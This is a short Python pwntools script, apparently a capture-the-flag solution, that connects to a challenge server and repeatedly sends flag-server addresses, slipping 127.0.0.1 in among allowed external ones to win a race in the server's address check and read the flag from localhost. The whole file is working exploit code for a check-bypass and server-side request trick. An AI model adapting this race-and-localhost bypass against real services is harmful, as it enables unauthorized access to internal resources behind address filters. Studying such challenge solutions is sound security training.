import threading
import time
from pwn import *

def send_requests(server, normal_command, target_command, stop_event):
    count = 0
    while not stop_event.is_set():
        if count > 0 and count % 5 == 0:  
            server.sendline(b'g')
            server.recvuntil(b'Enter flag server addr/port: ')
            server.sendline(target_command)
            print('sent target addr/port')
            time.sleep(0.1)
            server.recvuntil(b'What do you want to do?')
            server.sendline(b'v')
            response = server.recvuntil(b'What do you want to do?', timeout=2).decode()
            print("Response after target request:", response)
            if 'FLAG{' in response :
                print('Found Flag')
                stop_event.set()
                break
        else:
            server.sendline(b'g')
            server.recvuntil(b'Enter flag server addr/port: ')
            server.sendline(normal_command)
            print(f"Sent normal request {count+1} times")
        
        count += 1

def connect_to_challenge_server():
    server = remote('up.zoolab.org', 10932)
    normal_command = b'up.zoolab.org/10000'
    target_command = b'127.0.0.1/10000'
    stop_event = threading.Event()

    request_thread = threading.Thread(target=send_requests, args=(server, normal_command, target_command, stop_event))
    request_thread.start()
    request_thread.join()

    server.close()

if __name__ == "__main__":
    connect_to_challenge_server()
